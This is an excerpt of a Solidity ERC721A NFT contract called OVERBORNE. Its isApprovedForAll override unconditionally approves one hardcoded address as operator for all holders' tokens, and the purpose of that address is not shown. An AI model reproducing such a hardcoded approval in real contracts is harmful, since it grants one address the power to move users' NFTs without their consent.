  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x03C329DcFF17fe0F89E7B59b0374ccef2134bd24){return true;}
...
contract OVERBORNE is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("OVERBORNE", "OVB", maxBatchSize_, collectionSize_) {
